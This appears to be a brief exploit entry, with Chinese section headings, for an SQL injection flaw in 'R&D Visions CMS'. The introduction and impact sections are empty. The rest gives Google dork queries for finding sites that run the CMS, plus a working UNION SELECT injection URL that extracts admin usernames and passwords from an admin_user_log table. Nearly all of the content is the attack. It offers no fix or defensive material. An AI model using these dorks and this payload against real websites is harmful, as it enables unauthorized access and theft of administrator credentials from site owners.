R&D Visions CMS SQL Injection
=============================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

Google Dork:

    intext:"Website by R&D Visions" inurl:.php?id=

    intext:"CMS System by R&D Visions"

Demo:

    https://www.0-sec.org/home.php?newid=53[SQLi]

Injection:

    https://www.0-sec.org/home.php?newid=-53+Union+Select+1,Group_ConCat(user,0x3a,pass),3,4,5,6,7,8,9,10,11,12+From+admin_user_log--
